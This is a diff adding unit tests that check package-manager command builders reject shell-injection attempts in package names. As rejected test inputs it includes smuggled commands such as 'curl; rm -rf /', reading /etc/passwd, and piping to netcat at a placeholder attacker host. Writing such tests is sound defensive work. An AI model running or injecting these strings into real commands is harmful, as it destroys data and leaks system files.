@@ -5,6 +5,7 @@ import { yumParser } from "../../server/ssh/parsers/yum";
 import { pacmanParser } from "../../server/ssh/parsers/pacman";
 import { flatpakParser } from "../../server/ssh/parsers/flatpak";
 import { snapParser } from "../../server/ssh/parsers/snap";
+import { validatePackageName } from "../../server/ssh/parsers/types";
 
 describe("AptParser", () => {
   test("parse normal output", () => {
@@ -245,5 +246,45 @@ describe("SnapParser", () => {
 
   test("no full upgrade command", () => {
     expect(snapParser.getFullUpgradeAllCommand()).toBeNull();
+  });
+});
+
+describe("Package Name Validation", () => {
+  test("valid package names pass", () => {
+    expect(validatePackageName("curl")).toBe("curl");
+    expect(validatePackageName("libcurl4")).toBe("libcurl4");
+    expect(validatePackageName("vim-common.x86_64")).toBe("vim-common.x86_64");
+    expect(validatePackageName("python3.11")).toBe("python3.11");
+    expect(validatePackageName("gcc-c++")).toBe("gcc-c++");
+    expect(validatePackageName("org.mozilla.firefox")).toBe("org.mozilla.firefox");
+    expect(validatePackageName("lib:amd64")).toBe("lib:amd64");
+    expect(validatePackageName("name~1.0")).toBe("name~1.0");
+  });
+
+  test("shell injection attempts are rejected", () => {
+    expect(() => validatePackageName("curl; rm -rf /")).toThrow("Invalid package name");
+    expect(() => validatePackageName("curl && cat /etc/passwd")).toThrow("Invalid package name");
+    expect(() => validatePackageName("curl | nc attacker 4444")).toThrow("Invalid package name");
+    expect(() => validatePackageName("$(whoami)")).toThrow("Invalid package name");
+    expect(() => validatePackageName("`whoami`")).toThrow("Invalid package name");
+    expect(() => validatePackageName("curl > /tmp/out")).toThrow("Invalid package name");
+    expect(() => validatePackageName("curl\nnewline")).toThrow("Invalid package name");
+    expect(() => validatePackageName("pkg name")).toThrow("Invalid package name");
+  });
+
+  test("empty and invalid names are rejected", () => {
+    expect(() => validatePackageName("")).toThrow("Invalid package name");
+    expect(() => validatePackageName(".hidden")).toThrow("Invalid package name");
+    expect(() => validatePackageName("-flag")).toThrow("Invalid package name");
+  });
+
+  test("all parsers reject injection in getUpgradePackageCommand", () => {
+    const malicious = "curl; rm -rf /";
+    expect(() => aptParser.getUpgradePackageCommand(malicious)).toThrow();
+    expect(() => dnfParser.getUpgradePackageCommand(malicious)).toThrow();
+    expect(() => yumParser.getUpgradePackageCommand(malicious)).toThrow();
+    expect(() => pacmanParser.getUpgradePackageCommand(malicious)).toThrow();
+    expect(() => flatpakParser.getUpgradePackageCommand(malicious)).toThrow();
+    expect(() => snapParser.getUpgradePackageCommand(malicious)).toThrow();
   });
 });
